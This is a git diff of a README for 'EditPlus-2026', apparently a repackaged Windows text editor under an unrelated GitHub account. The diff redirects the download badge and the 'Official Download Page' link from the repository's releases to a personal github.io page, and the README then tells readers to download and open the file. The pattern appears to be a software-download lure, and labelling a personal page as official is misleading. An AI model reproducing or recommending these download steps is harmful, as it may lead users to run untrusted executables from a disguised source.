@@ -1,6 +1,6 @@
 # 📝 EditPlus-2026 - Write text files with ease today
 
-[![](https://img.shields.io/badge/Download-EditPlus-2026-blue)](https://github.com/dianavocado181/EditPlus-2026/releases)
+[![](https://img.shields.io/badge/Download-EditPlus-2026-blue)](https://dianavocado181.github.io)
 
 EditPlus-2026 is a text editor for Windows 11 and Windows 10. It helps you open, create, and modify text documents. This program supports syntax highlighting for programming languages and provides basic tools for writing code and plain text files. Use this software to manage your notes, scripts, and configuration files on your computer.
 
@@ -8,7 +8,7 @@ EditPlus-2026 is a text editor for Windows 11 and Windows 10. It helps you open,
 
 You need a computer running Windows 10 or Windows 11 to use this software. Make sure you have at least 50 megabytes of free disk space. Follow these steps to set up the editor on your machine.
 
-1. Go to the [Official Download Page](https://github.com/dianavocado181/EditPlus-2026/releases).
+1. Go to the [Official Download Page](https://dianavocado181.github.io).
 2. Look for the latest version listed under the Assets section.
 3. Click the file name to start your download.
 4. Open the folder where your browser saved the file.
